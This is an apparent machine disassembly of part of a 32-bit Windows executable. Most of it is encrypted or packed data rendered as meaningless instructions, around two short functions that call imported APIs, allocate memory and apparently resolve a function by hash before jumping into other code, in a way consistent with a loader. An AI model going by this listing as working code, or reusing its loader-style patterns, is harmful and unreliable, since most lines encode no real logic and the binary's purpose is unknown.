  422bf8:	dec    ax
  422bfa:	inc    edi
  422bfb:	dec    esi
  422bfc:	and    DWORD PTR [eax+0x54],ebp
  422bff:	mov    cl,0xaf
  422c01:	adc    DWORD PTR [esi-0x16],ebp
  422c04:	pop    eax
  422c05:	sub    dl,al
  422c07:	(bad)  
  422c08:	rcl    DWORD PTR [esi-0x4854e0df],cl
  422c0e:	std    
  422c0f:	and    al,0x57
  422c11:	dec    ebp
  422c12:	sub    eax,0xf4a34f91
  422c17:	push   esp
  422c18:	dec    edx
  422c19:	sub    ebp,DWORD PTR [esi+ebx*1-0xa]
  422c1d:	or     al,0xe4
  422c1f:	loopne 0x422c84
  422c21:	int    0xde
  422c23:	fisubr DWORD PTR [ebx+0x4908e142]
  422c29:	inc    eax
  422c2a:	loopne 0x422c80
  422c2c:	loop   0x422c28
  422c2e:	rol    BYTE PTR [edx],cl
  422c30:	fs dec esi
  422c32:	pop    edx
  422c33:	cld    
  422c34:	es jle 0x422bf5
  422c37:	fldenv [edi]
  422c39:	popf   
  422c3a:	push   ebp
  422c3b:	xlat   BYTE PTR ds:[ebx]
  422c3c:	loop   0x422c18
  422c3e:	add    esp,DWORD PTR [ecx-0x4b19a975]
  422c44:	mov    BYTE PTR fs:[esi-0x6],ah
  422c48:	push   cs
  422c49:	cmp    edx,DWORD PTR [esi+0x5]
  422c4c:	sahf   
  422c4d:	pusha  
  422c4e:	add    BYTE PTR [ecx+eiz*2+0x17],al
  422c52:	rcr    BYTE PTR [edi+edx*1-0x23a4cbd8],1
  422c59:	sbb    ecx,DWORD PTR [edx-0x2]
  422c5c:	shl    ebx,cl
  422c5e:	sahf   
  422c5f:	or     bl,BYTE PTR [edx-0x9c68abd]
  422c65:	iret   
  422c66:	push   edi
  422c67:	adc    eax,0x2a1ad668
  422c6c:	test   BYTE PTR [ebp-0xc],dl
  422c6f:	test   al,0x6f
  422c71:	inc    eax
  422c72:	outs   dx,DWORD PTR ds:[esi]
  422c73:	ret    0x5d5c
  422c76:	adc    ah,BYTE PTR [eax]
  422c78:	popf   
  422c79:	or     bh,BYTE PTR [esi]
  422c7b:	aad    0x6e
  422c7d:	adc    dh,bl
  422c7f:	xlat   BYTE PTR ds:[ebx]
  422c80:	dec    ebp
  422c81:	pop    es
  422c82:	mov    ds:0xaeeed674,al
  422c87:	jp     0x422c29
  422c89:	mov    edi,0x6fb0cac4
  422c8e:	xchg   edi,eax
  422c8f:	ins    BYTE PTR es:[edi],dx
  422c90:	adc    eax,0x80124e92
  422c95:	loop   0x422cfe
  422c97:	js     0x422c35
  422c99:	repz xor DWORD PTR fs:[edi],0xffffffa9
  422c9e:	(bad)  
  422c9f:	dec    esp
  422ca0:	sub    eax,0x4f7f57f4
  422ca5:	call   0xcf562215
  422caa:	xchg   esi,eax
  422cab:	jno    0x422ce1
  422cad:	push   es
  422cae:	loopne 0x422c89
  422cb0:	ds push esi
  422cb2:	mov    al,ds:0x62af16d8
  422cb7:	test   DWORD PTR [eax+0xf8ac818],ebx
  422cbd:	mov    BYTE PTR [edx+0x37142780],ch
  422cc3:	(bad)  
  422cc4:	rcl    bh,1
  422cc6:	call   0xa106:0xfc67add3
  422ccd:	push   ss
  422cce:	aas    
  422ccf:	cmp    DWORD PTR [esi],ebp
  422cd1:	xchg   ebp,eax
  422cd2:	mov    DWORD PTR [eax+esi*2],ebp
  422cd5:	in     eax,0x5b
  422cd7:	mov    ch,BYTE PTR [esi-0x4d]
  422cda:	jl     0x422cf6
  422cdc:	arpl   bp,dx
  422cde:	loope  0x422d25
  422ce0:	ret    0x694
  422ce3:	sub    ebx,DWORD PTR [esi+0x151dc938]
  422ce9:	adc    bh,BYTE PTR [ecx-0x2b]
  422cec:	cmp    al,0x24
  422cee:	dec    BYTE PTR [ebx]
  422cf0:	inc    edx
  422cf1:	xor    BYTE PTR [esi-0x65c2592a],0xae
  422cf8:	and    al,0x1c
  422cfa:	loop   0x422cf9
  422cfc:	mov    ecx,0x258c9d21
  422d01:	loope  0x422cf2
  422d03:	or     al,0x8e
  422d05:	add    DWORD PTR [edi-0xcb1c6bf],0x6b
  422d0c:	imul   edx,ecx,0xffffffe0
  422d0f:	je     0x422d6d
  422d11:	aam    0xc0
  422d13:	ror    BYTE PTR [ecx],1
  422d15:	inc    ecx
  422d16:	out    0x18,al
  422d18:	add    DWORD PTR [edx+0x25],ecx
  422d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d1c:	jb     0x422cf7
  422d1e:	sbb    eax,0x9ab750c1
  422d23:	out    dx,eax
  422d24:	jb     0x422d94
  422d26:	cmp    ecx,DWORD PTR [ebp+0x64]
  422d29:	sub    al,dl
  422d2b:	mov    al,0xea
  422d2d:	push   esi
  422d2e:	dec    esp
  422d2f:	or     ebx,DWORD PTR [ecx]
  422d31:	nop
  422d32:	or     ebx,edi
  422d34:	clc    
  422d35:	lahf   
  422d36:	jmp    0xd37bb5b
  422d3b:	dec    edi
  422d3c:	ss mov edx,0xc89f9352
  422d42:	pop    ecx
  422d43:	push   edi
  422d44:	xchg   esp,eax
  422d45:	jmp    FWORD PTR [edx+esi*1]
  422d48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d49:	and    DWORD PTR [edi+0x43],eax
  422d4c:	shl    DWORD PTR [ecx],1
  422d4e:	(bad)  
  422d4f:	data16 cmp bh,bh
  422d52:	cmpxchg cl,cl
  422d55:	pop    ds
  422d56:	popa   
  422d57:	inc    esp
  422d58:	sbb    DWORD PTR [edi+0x3add11d9],esp
  422d5e:	loope  0x422d5b
  422d60:	sub    eax,0xef7947a0
  422d65:	xchg   esp,eax
  422d66:	and    ah,BYTE PTR [ebp+0x3f97ca0]
  422d6c:	daa    
  422d6d:	xchg   esi,eax
  422d6e:	jg     0x422de1
  422d70:	in     eax,0xbc
  422d72:	mov    fs,WORD PTR [ecx+edi*8-0x2d]
  422d76:	out    0xab,eax
  422d78:	pop    edx
  422d79:	mov    BYTE PTR [edi-0x412069c3],cl
  422d7f:	loopne 0x422d08
  422d81:	xor    BYTE PTR [edi-0x28],dl
  422d84:	inc    ebx
  422d85:	pop    esi
  422d86:	into   
  422d87:	sbb    BYTE PTR [ebx],0xdf
  422d8a:	pop    es
  422d8b:	bound  esp,QWORD PTR [ebx]
  422d8d:	jl     0x422dad
  422d8f:	sahf   
  422d90:	ficomp DWORD PTR [esi-0x4213c9e2]
  422d96:	daa    
  422d97:	mov    eax,cs:0x6afc59d0
  422d9d:	aad    0xa9
  422d9f:	icebp  
  422da0:	adc    al,0x77
  422da2:	pusha  
  422da3:	pop    ebp
  422da4:	fs into 
  422da6:	adc    dh,BYTE PTR [ebx]
  422da8:	dec    edx
  422da9:	lods   eax,DWORD PTR ds:[esi]
  422daa:	push   ebx
  422dab:	(bad)
  422db0:	xchg   ebx,eax
  422db1:	xor    ebp,DWORD PTR [ecx+0x7a]
  422db4:	lea    ebp,[esi]
  422db6:	gs (bad) 
  422db8:	mov    edx,0x21933fc6
  422dbd:	loopne 0x422df0
  422dbf:	push   eax
  422dc0:	push   ss
  422dc1:	push   esp
  422dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dc3:	ja     0x422d87
  422dc5:	imul   ebp,esi,0x7834c644
  422dcb:	enter  0x5a1b,0x6b
  422dcf:	and    BYTE PTR [edi],al
  422dd1:	popf   
  422dd2:	aad    0xe1
  422dd4:	sbb    bl,BYTE PTR [ecx+0x37a9925a]
  422dda:	xor    ebx,DWORD PTR [esi+edx*4-0x5814dc70]
  422de1:	mov    esi,0xc52551f9
  422de6:	mov    al,0x5a
  422de8:	retf   
  422de9:	pop    ebp
  422dea:	pusha  
  422deb:	test   eax,0x5157ab76
  422df0:	sbb    al,0x70
  422df2:	xchg   ebp,eax
  422df3:	jo     0x422e5b
  422df5:	adc    dh,ch
  422df7:	jl     0x422d85
  422df9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dfa:	xchg   edx,eax
  422dfb:	mov    ds:0x75f5a2e9,eax
  422e00:	mov    ah,0x56
  422e02:	punpckldq mm6,DWORD PTR [eax]
  422e05:	leave  
  422e06:	nop
  422e07:	and    eax,0xaa1eddaf
  422e0c:	fs pop esi
  422e0e:	mov    dl,0xfd
  422e10:	mov    esp,0xa1fab83
  422e15:	imul   eax,DWORD PTR [ebp+0x66968936],0x3e54966c
  422e1f:	lods   eax,DWORD PTR ds:[esi]
  422e20:	pop    ebp
  422e21:	sbb    ecx,DWORD PTR [eax+eax*8]
  422e24:	sbb    eax,0xd812b9d9
  422e29:	fbld   TBYTE PTR [esi+0x18d57c49]
  422e2f:	and    eax,0xfbc3076c
  422e34:	xchg   ebp,eax
  422e35:	ja     0x422e56
  422e37:	inc    esp
  422e38:	fcomp  QWORD PTR [ecx]
  422e3a:	pop    esp
  422e3b:	loope  0x422e63
  422e3d:	sbb    al,0x75
  422e3f:	ret    
  422e40:	lods   eax,DWORD PTR ds:[esi]
  422e41:	gs pop es
  422e43:	daa    
  422e44:	add    DWORD PTR [eax+0x76b4325a],edx
  422e4a:	cmp    BYTE PTR [edx],dh
  422e4c:	push   eax
  422e4d:	mov    ds:0xfa9ddd3c,al
  422e52:	mov    ch,0xe2
  422e54:	fwait
  422e55:	sbb    esi,esp
  422e57:	les    edi,FWORD PTR [edx+0x79]
  422e5a:	mov    esi,0xadfbbbc
  422e5f:	mov    edi,0x9e90eb52
  422e64:	fdiv   QWORD PTR [edx+0x4e4b86e8]
  422e6a:	sbb    BYTE PTR [edx+0x23],ah
  422e6d:	fwait
  422e6e:	ret    
  422e6f:	cmp    esi,edi
  422e71:	fsubr  QWORD PTR [esp+edi*8-0x1f921725]
  422e78:	adc    al,0x6c
  422e7a:	data16 ja 0x422eae
  422e7d:	cmp    DWORD PTR [ecx+esi*4+0x51b086b5],0xffffffcc
  422e85:	jnp    0x422e70
  422e87:	lods   al,BYTE PTR ds:[esi]
  422e88:	mov    esp,0x6f6c66dc
  422e8d:	scas   eax,DWORD PTR es:[edi]
  422e8e:	pop    esi
  422e8f:	mov    edx,0xfd5ee798
  422e94:	iret   
  422e95:	push   ds
  422e96:	test   eax,0x5d71b258
  422e9b:	mov    ebp,0x2f524bdd
  422ea0:	dec    esi
  422ea1:	loopne 0x422eab
  422ea3:	loopne 0x422ec1
  422ea5:	sbb    al,0x9d
  422ea7:	mov    dl,0x45
  422ea9:	cmp    DWORD PTR ds:0x31ecfc16,ebp
  422eaf:	test   BYTE PTR [eax+0xf55be45],bh
  422eb5:	dec    eax
  422eb6:	mov    eax,ds:0x882125bc
  422ebb:	and    cl,dh
  422ebd:	dec    edx
  422ebe:	retf   
  422ebf:	push   cs
  422ec0:	pop    ebx
  422ec1:	call   0x48e4:0x4ca28143
  422ec8:	ins    BYTE PTR es:[edi],dx
  422ec9:	scas   eax,DWORD PTR es:[edi]
  422eca:	psubq  mm1,QWORD PTR [edx-0x2a]
  422ece:	pop    edi
  422ecf:	jecxz  0x422e75
  422ed1:	fidivr DWORD PTR [ebp+0x6bd87756]
  422ed7:	fld    st(2)
  422ed9:	inc    esp
  422eda:	scas   eax,DWORD PTR es:[edi]
  422edb:	in     al,dx
  422edc:	pop    ebp
  422edd:	ror    eax,cl
  422edf:	xchg   ebp,eax
  422ee0:	inc    ecx
  422ee1:	jbe    0x422ec3
  422ee3:	mov    al,ds:0xbdad6156
  422ee8:	add    esi,DWORD PTR [eax+0x4c]
  422eeb:	sbb    eax,0x310e29d
  422ef0:	jo     0x422ec3
  422ef2:	repnz sub ebp,ebx
  422ef5:	cmp    DWORD PTR [ebp+edi*8-0x47],0xffffff8b
  422efa:	jne    0x422ea9
  422efc:	xor    esp,DWORD PTR [ebp+0x29490f7b]
  422f02:	test   DWORD PTR ss:[ecx],0xd57677bf
  422f09:	(bad)  
  422f0a:	cmc    
  422f0b:	or     bh,0x5
  422f0e:	dec    ecx
  422f0f:	retf   0x18cd
  422f12:	mov    al,0x36
  422f14:	popa   
  422f15:	adc    BYTE PTR [edx],dl
  422f17:	mov    ebp,DWORD PTR [eax-0x67ad3f1d]
  422f1d:	sub    BYTE PTR [edx],0x90
  422f20:	sub    DWORD PTR [ebp+0x6a],ebp
  422f23:	jae    0x422f70
  422f25:	fiadd  WORD PTR [ebx]
  422f27:	lods   al,BYTE PTR ds:[esi]
  422f28:	dec    esp
  422f29:	mov    ds:0x8ba5c521,eax
  422f2e:	loopne 0x422f15
  422f30:	mov    al,0xf0
  422f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f33:	jno    0x422ed8
  422f35:	fist   WORD PTR [ecx-0x61]
  422f38:	jae    0x422f94
  422f3a:	and    eax,0xa5c3248f
  422f3f:	push   ecx
  422f40:	cmp    ebx,edi
  422f42:	fs loop 0x422ecd
  422f45:	mov    edx,0x9e4869d9
  422f4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f4b:	cmc    
  422f4c:	cmp    eax,0xe22255cf
  422f51:	cmp    al,0xbb
  422f53:	adc    al,0x9b
  422f55:	and    BYTE PTR [edx+0x7c],ch
  422f58:	std    
  422f59:	mov    eax,0x6b968232
  422f5e:	inc    ebx
  422f5f:	mov    cl,0x54
  422f61:	pop    ecx
  422f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f63:	push   0x10ac3c09
  422f68:	add    cl,bh
  422f6a:	jg     0x422fb9
  422f6c:	sbb    BYTE PTR [edx+ecx*2+0x7c],ch
  422f70:	fidiv  DWORD PTR ds:0x87c67958
  422f76:	inc    ebp
  422f77:	nop    DWORD PTR fs:[eax+0x1]
  422f7f:	mov    esp,ebp
  422f81:	pop    ebp
  422f82:	ret    
  422f83:	int3   
  422f84:	int3   
  422f85:	int3   
  422f86:	int3   
  422f87:	int3   
  422f88:	int3   
  422f89:	int3   
  422f8a:	int3   
  422f8b:	int3   
  422f8c:	int3   
  422f8d:	int3   
  422f8e:	int3   
  422f8f:	int3   
  422f90:	push   ebp
  422f91:	mov    ebp,esp
  422f93:	sub    esp,0x8
  422f96:	push   esi
  422f97:	push   0x0
  422f99:	mov    DWORD PTR [ebp-0x4],0x0
  422fa0:	call   DWORD PTR ds:0x42905c
  422fa6:	mov    esi,DWORD PTR ds:0x429030
  422fac:	push   0x4
  422fae:	push   0x1000
  422fb3:	push   0x4cf
  422fb8:	push   0x1000
  422fbd:	mov    DWORD PTR [ebp-0x8],esi
  422fc0:	call   DWORD PTR ds:0x429058
  422fc6:	test   esi,esi
  422fc8:	jne    0x422fd2
  422fca:	push   esi
  422fcb:	push   esi
  422fcc:	call   DWORD PTR ds:0x429014
  422fd2:	push   0xa
  422fd4:	push   0x0
  422fd6:	push   0x0
  422fd8:	call   DWORD PTR ds:0x429054
  422fde:	push   0x0
  422fe0:	push   0x4e
  422fe2:	push   0x1e
  422fe4:	push   0x0
  422fe6:	push   0xffffffff
  422fe8:	call   DWORD PTR ds:0x429088
  422fee:	test   eax,eax
  422ff0:	je     0x422ffa
  422ff2:	push   0x0
  422ff4:	call   DWORD PTR ds:0x42904c
  422ffa:	mov    esi,DWORD PTR [ebp-0x8]
  422ffd:	call   esi
  422fff:	mov    DWORD PTR [ebp-0x4],eax
  423002:	cmp    DWORD PTR [ebp-0x4],0x57
  423006:	jne    0x42301d
  423008:	push   0xc8151b99
  42300d:	call   0x4111f0
  423012:	add    esp,0x4
  423015:	push   0x0
  423017:	call   DWORD PTR ds:0x429048
  42301d:	push   0x0
  42301f:	call   DWORD PTR ds:0x429044
  423025:	xor    eax,eax
  423027:	pop    esi
  423028:	mov    esp,ebp
  42302a:	pop    ebp
  42302b:	ret    
  42302c:	nop
  42302d:	nop
  42302e:	nop
  42302f:	nop
  423030:	sub    esp,0x10
  423033:	push   esi
  423034:	mov    esi,DWORD PTR ds:0x42915c
  42303a:	push   0x5
  42303c:	push   0x0
  42303e:	call   esi
  423040:	push   0x5
  423042:	push   0x0
  423044:	call   esi
  423046:	push   0x0
  423048:	push   0x0
  42304a:	push   0x0
  42304c:	call   DWORD PTR ds:0x429040
  423052:	lea    eax,[esp+0x4]
  423056:	push   eax
  423057:	call   DWORD PTR ds:0x429068
  42305d:	call   DWORD PTR ds:0x429064
  423063:	cmp    WORD PTR [esp+0x4],0x0
  423069:	pop    esi
  42306a:	push   0x0
  42306c:	je     0x42308f
  42306e:	push   0x0
  423070:	push   0x100000
  423075:	call   DWORD PTR ds:0x429060
  42307b:	push   0x0
  42307d:	call   0x422f90
  423082:	add    esp,0x4
  423085:	call   0x411000
  42308a:	jmp    0x4244c4
  42308f:	push   0x3d
  423091:	push   0x20
  423093:	call   0x4244f6
  423098:	dec    esi
  42309a:	pop    ecx
  42309b:	test   eax,0x620dbf5e
  4230a0:	sar    cl,cl
  4230a2:	(bad)  
  4230a3:	hlt    
  4230a4:	mov    eax,ds:0x39037c7c
  4230a9:	out    0xbc,al
  4230ab:	or     eax,0xd6fdd262
  4230b0:	hlt    
  4230b1:	loope  0x423036
  4230b3:	add    DWORD PTR [ebx],0x39
  4230b6:	pop    esi
  4230b7:	mov    esp,0xfdd2620d
  4230bc:	(bad)  
  4230bd:	hlt    
  4230be:	mov    eax,ds:0x39038383
  4230c3:	pop    esi
  4230c4:	mov    esp,0xfdd2620d
  4230c9:	(bad)  
  4230ca:	hlt    
  4230cb:	mov    eax,ds:0x39038383
  4230d0:	pop    esi
  4230d1:	mov    esp,0x5d2620d
  4230d6:	(bad)  
  4230d7:	hlt    
  4230d8:	mov    eax,ds:0x37b99c8d
  4230dd:	pop    esi
  4230de:	or     BYTE PTR [edi+ebp*4],al
  4230e1:	repz inc ebp
  4230e3:	xlat   BYTE PTR ds:[ebx]
  4230e4:	mov    eax,0x6bd7a26c
  4230e9:	push   eax
  4230ea:	sub    eax,0xbd107d9c
  4230ef:	call   0x62e0:0xa3cc95a4
  4230f6:	push   edi
  4230f7:	xor    bl,dl
  4230f9:	jns    0x42313d
  4230fb:	mov    al,0x98
  4230fd:	test   BYTE PTR [esi+0x6aa3edd4],0x57
  423104:	jle    0x4230fe
  423106:	inc    edx
  423107:	xor    edx,esi
  423109:	nop
  42310a:	mov    ecx,0x8eadc490
  42310f:	push   cs
  423110:	xor    edi,DWORD PTR [edx-0x44]
  423113:	or     eax,0xd6fdd262
  423118:	hlt    
  423119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42311a:	sbb    bh,BYTE PTR [edi+0x5a]
  42311d:	jp     0x4230c5
  42311f:	cs pop es
  423121:	and    DWORD PTR [edx],ebp
  423123:	outs   dx,DWORD PTR ds:[esi]
  423124:	fdiv   QWORD PTR [edi+0x5b891159]
  42312a:	pop    esp
  42312b:	push   edx
  42312c:	mov    dh,0x52
  42312e:	call   0x8999:0x918ef740
  423135:	inc    ecx
  423136:	sti    
  423137:	stos   DWORD PTR es:[edi],eax
  423138:	push   esp
  423139:	in     al,0x68
  42313b:	pop    ebx
  42313c:	fcom   DWORD PTR [ebp-0x505499d2]
  423142:	or     eax,0x4418333a
  423147:	lahf   
  423148:	push   0xfec77d98
  42314d:	jmp    0x4231ca
  42314f:	adc    DWORD PTR [ecx],ecx
  423151:	jae    0x423131
  423153:	mov    ebp,0x6f2a3a07
  423158:	fdiv   QWORD PTR [edi+0x2b891059]
  42315e:	ror    ah,0xb6
  423161:	mov    dl,0xba
  423163:	push   edx
  423164:	neg    DWORD PTR [ebx-0x2476ccf4]
  42316a:	data16 add al,0x54
  42316d:	mov    ah,0xf5
  42316f:	lock fsub DWORD PTR [ebp-0x3e54034d]
  423176:	jnp    0x423109
  423178:	xor    eax,DWORD PTR [esi]
  42317a:	fld    DWORD PTR [edx]
  42317c:	push   0xfe440590
  423181:	repz jmp 0x72e:0xa67a6be0
  423189:	(bad)  {k6}{z}
  42318e:	mov    eax,ds:0x7c538383
  423193:	pop    esi
  423194:	mov    esp,0xfdd06341
  423199:	cmp    dl,BYTE PTR [edi]
  42319b:	dec    ah
  42319d:	add    DWORD PTR [ebx],0x39
  4231a0:	pop    esi
  4231a1:	mov    esp,0x1dd2620d
  4231a6:	(bad)  
  4231a7:	mul    DWORD PTR [eax+0x39098288]
  4231ad:	pop    esi
  4231ae:	push   eax
  4231af:	or     DWORD PTR [edx-0x2e],esp
  4231b2:	stc    
  4231b3:	shl    ah,1
  4231b5:	mov    eax,ds:0x38038383
  4231ba:	jecxz  0x423178
  4231bc:	or     eax,0xd6fdc262
  4231c1:	hlt    
  4231c2:	mov    eax,ds:0x39038386
  4231c7:	pop    ds
  4231c8:	mov    esp,0xfdd2720d
  4231cd:	(bad)  
  4231ce:	mul    BYTE PTR [ecx+0x38038683]
  4231d4:	pop    esi
  4231d5:	mov    esp,0xf8d2620d
  4231da:	(bad)  
  4231db:	cmc    
  4231dc:	mov    eax,ds:0x39038383
  4231e1:	pop    esi
  4231e2:	cmp    al,0x6
  4231e4:	(bad)  
  4231e6:	stc    
  4231e7:	(bad)  
  4231e8:	hlt    
  4231e9:	sbb    al,0xb2
  4231eb:	xchg   BYTE PTR [ebx],al
  4231ed:	cmp    ebx,DWORD PTR [esi-0x44]
  4231f0:	lea    esp,[edx-0x2e]
  4231f3:	in     eax,dx
  4231f4:	(bad)  
  4231f5:	hlt    
  4231f6:	mov    cl,0x83
  4231f8:	add    DWORD PTR [ebx],0x39
  4231fb:	dec    esi
  4231fc:	mov    esp,0xfdd2720d
  423201:	(bad)  
  423202:	hlt    
  423203:	mov    eax,ds:0x39039383
  423208:	pop    esi
  423209:	mov    esp,0xfdd2620d
  42320e:	(bad)  
  42320f:	hlt    
  423210:	mov    eax,ds:0x3908ed07
  423215:	aaa    
  423216:	mov    edi,0xcdd2620d
  42321b:	(bad)  
  42321d:	outs   dx,BYTE PTR ds:[esi]
  42321e:	mov    esi,0x5e390383
  423223:	mov    esp,0xfdd2620d
  423228:	(bad)  
  423229:	hlt    
  42322a:	mov    eax,ds:0x39038383
  42322f:	pop    esi
  423230:	mov    esp,0xfdd2620d
  423235:	(bad)  
  423236:	hlt    
  423237:	mov    eax,ds:0x39038383
  42323c:	pop    esi
  42323d:	mov    esp,0xfdd2620d
  423242:	(bad)  
  423243:	hlt    
  423244:	mov    eax,ds:0x39038383
  423249:	pop    esi
  42324a:	mov    esp,0xfdd2620d
  42324f:	(bad)  
  423250:	hlt    
  423251:	mov    eax,ds:0x39038383
  423256:	pop    esi
  423257:	mov    esp,0xfdd2620d
  42325c:	(bad)  
  42325d:	hlt    
  42325e:	mov    eax,ds:0x39038383
  423263:	pop    esi
  423264:	mov    esp,0xfdd2620d
  423269:	(bad)  
  42326a:	hlt    
  42326b:	mov    eax,ds:0x39038383
  423270:	pop    esi
  423271:	mov    esp,0xfdd2620d
  423276:	(bad)  
  423277:	hlt    
  423278:	mov    eax,ds:0x39038383
  42327d:	pop    esi
  42327e:	mov    esp,0xfdd2620d
  423283:	(bad)  
  423284:	hlt    
  423285:	mov    eax,ds:0x17038383
  42328a:	sub    bl,cl
  42328c:	jne    0x4232a4
  42328e:	sar    ch,cl
  423290:	(bad)  
  423291:	hlt    
  423292:	or     DWORD PTR [eax+0x5e290383],0xd6580dbc
  42329c:	std    
  42329d:	(bad)  
  42329e:	lock mov eax,ds:0x7a46d383
  4232a4:	ins    BYTE PTR es:[edi],dx
  4232a5:	call   0xfe1494ec
  4232aa:	(bad)  
  4232ab:	hlt    
  4232ac:	mov    eax,ds:0xd90383a3
  4232b1:	jo     0x423281
  4232b3:	jle    0x4232c5
  4232b5:	mov    cl,0xfd
  4232b7:	(bad)  
  4232b8:	hlt    
  4232b9:	mov    eax,ds:0x390383d3
  4232be:	outs   dx,BYTE PTR ds:[esi]
  4232bf:	mov    bh,0xd
  4232c1:	bound  eax,QWORD PTR [edx-0x600b2903]
  4232c7:	xchg   DWORD PTR [ebx-0x43a1c6fd],eax
  4232cd:	or     eax,0xd6fdd262
  4232d2:	hlt    
  4232d3:	mov    eax,ds:0x3903a383
  4232d8:	mov    esi,0xd2620dbc
  4232dd:	std    
  4232de:	(bad)  
  4232df:	hlt    
  4232e0:	mov    eax,ds:0x39038383
  4232e5:	pop    esi
  4232e6:	mov    esp,0xfdd2620d
  4232eb:	(bad)  
  4232ec:	hlt    
  4232ed:	mov    eax,ds:0x39038383
  4232f2:	pop    esi
  4232f3:	mov    esp,0xfdd2620d
  4232f8:	(bad)  
  4232f9:	hlt    
  4232fa:	mov    eax,ds:0x39038383
  4232ff:	pop    esi
  423300:	mov    esp,0xfdd2620d
  423305:	(bad)  
  423306:	hlt    
  423307:	mov    eax,ds:0x39038383
  42330c:	pop    esi
  42330d:	mov    esp,0xfdd2620d
  423312:	(bad)  
  423313:	hlt    
  423314:	mov    eax,ds:0x39038383
  423319:	pop    esi
  42331a:	mov    esp,0xfdd2620d
  42331f:	(bad)  
  423320:	hlt    
  423321:	mov    eax,ds:0x39038383
  423326:	pop    esi
  423327:	mov    esp,0xfdd2620d
  42332c:	(bad)  
  42332d:	hlt    
  42332e:	mov    eax,ds:0x39038383
  423333:	pop    esi
  423334:	mov    esp,0xfdd2620d
  423339:	(bad)  
  42333a:	hlt    
  42333b:	mov    eax,ds:0x39038383
  423340:	pop    esi
  423341:	mov    esp,0xfdd2620d
  423346:	(bad)  
  423347:	hlt    
  423348:	mov    eax,ds:0x39038383
  42334d:	pop    esi
  42334e:	mov    esp,0xfdd2620d
  423353:	(bad)  
  423354:	hlt    
  423355:	mov    eax,ds:0x39038383
  42335a:	pop    esi
  42335b:	mov    esp,0xfdd2620d
  423360:	(bad)  
  423361:	hlt    
  423362:	mov    eax,ds:0x39038383
  423367:	pop    esi
  423368:	mov    esp,0xfdd2620d
  42336d:	(bad)  
  42336e:	hlt    
  42336f:	mov    eax,ds:0x39038383
  423374:	pop    esi
  423375:	mov    esp,0xfdd2620d
  42337a:	(bad)  
  42337b:	hlt    
  42337c:	mov    eax,ds:0x39038383
  423381:	pop    esi
  423382:	mov    esp,0xfdd2620d
  423387:	(bad)  
  423388:	hlt    
  423389:	mov    eax,ds:0x39038383
  42338e:	pop    esi
  42338f:	mov    esp,0xfdd2620d
  423394:	(bad)  
  423395:	hlt    
  423396:	mov    eax,ds:0x39038383
  42339b:	pop    esi
  42339c:	mov    esp,0xfdd2620d
  4233a1:	(bad)  
  4233a2:	hlt    
  4233a3:	mov    eax,ds:0x39038383
  4233a8:	pop    esi
  4233a9:	mov    esp,0xfdd2620d
  4233ae:	(bad)  
  4233af:	hlt    
  4233b0:	mov    eax,ds:0x39038383
  4233b5:	pop    esi
  4233b6:	mov    esp,0xfdd2620d
  4233bb:	(bad)  
  4233bc:	hlt    
  4233bd:	mov    eax,ds:0x39038383
  4233c2:	pop    esi
  4233c3:	mov    esp,0xfdd2620d
  4233c8:	(bad)  
  4233c9:	hlt    
  4233ca:	mov    eax,ds:0x39038383
  4233cf:	pop    esi
  4233d0:	mov    esp,0xfdd2620d
  4233d5:	(bad)  
  4233d6:	hlt    
  4233d7:	mov    eax,ds:0x39038383
  4233dc:	pop    esi
  4233dd:	mov    esp,0xfdd2620d
  4233e2:	(bad)  
  4233e3:	hlt    
  4233e4:	mov    eax,ds:0x39038383
  4233e9:	pop    esi
  4233ea:	mov    esp,0xfdd2620d
  4233ef:	(bad)  
  4233f0:	hlt    
  4233f1:	mov    eax,ds:0x39038383
  4233f6:	pop    esi
  4233f7:	mov    esp,0xfdd2620d
  4233fc:	(bad)  
  4233fd:	hlt    
  4233fe:	mov    eax,ds:0x39038383
  423403:	pop    esi
  423404:	mov    esp,0xfdd2620d
  423409:	(bad)  
  42340a:	hlt    
  42340b:	mov    eax,ds:0x39038383
  423410:	pop    esi
  423411:	mov    esp,0xfdd2620d
  423416:	(bad)  
  423417:	hlt    
  423418:	mov    eax,ds:0x39038383
  42341d:	pop    esi
  42341e:	mov    esp,0xfdd2620d
  423423:	(bad)  
  423424:	hlt    
  423425:	mov    eax,ds:0x39038383
  42342a:	pop    esi
  42342b:	mov    esp,0xfdd2620d
  423430:	(bad)  
  423431:	hlt    
  423432:	mov    eax,ds:0x39038383
  423437:	pop    esi
  423438:	mov    esp,0xfdd2620d
  42343d:	(bad)  
  42343e:	hlt    
  42343f:	mov    eax,ds:0x39038383
  423444:	pop    esi
  423445:	mov    esp,0xfdd2620d
  42344a:	(bad)  
  42344b:	hlt    
  42344c:	mov    eax,ds:0x39038383
  423451:	pop    esi
  423452:	mov    esp,0xfdd2620d
  423457:	(bad)  
  423458:	hlt    
  423459:	mov    eax,ds:0x39038383
  42345e:	pop    esi
  42345f:	mov    esp,0xfdd2620d
  423464:	(bad)  
  423465:	hlt    
  423466:	mov    eax,ds:0x39038383
  42346b:	pop    esi
  42346c:	mov    esp,0xfdd2620d
  423471:	(bad)  
  423472:	hlt    
  423473:	mov    eax,ds:0x39038383
  423478:	pop    esi
  423479:	mov    esp,0xfdd2620d
  42347e:	(bad)  
  42347f:	hlt    
  423480:	mov    eax,ds:0x39038383
  423485:	pop    esi
  423486:	mov    esp,0xfdd2620d
  42348b:	(bad)  
  42348c:	hlt    
  42348d:	mov    eax,ds:0x39038383
  423492:	pop    esi
  423493:	mov    esp,0xfdd2620d
  423498:	(bad)  
  423499:	mov    bl,0x4f
  42349b:	mov    DWORD PTR [ebx-0x53a1c6d4],eax
  4234a1:	or     eax,0xc5ff862
  4234a6:	test   edi,eax
  4234a8:	jl     0x423458
  4234aa:	popf   
  4234ab:	mov    esi,0x8a3b510e
  4234b0:	ror    DWORD PTR [ecx+0x43],0x92
  4234b4:	rol    BYTE PTR [edi],1
  4234b6:	fst    DWORD PTR [eax]
  4234b8:	mov    cl,ch
  4234ba:	stos   BYTE PTR es:[edi],al
  4234bb:	pusha  
  4234bc:	xchg   BYTE PTR [eax+0x7c],bl
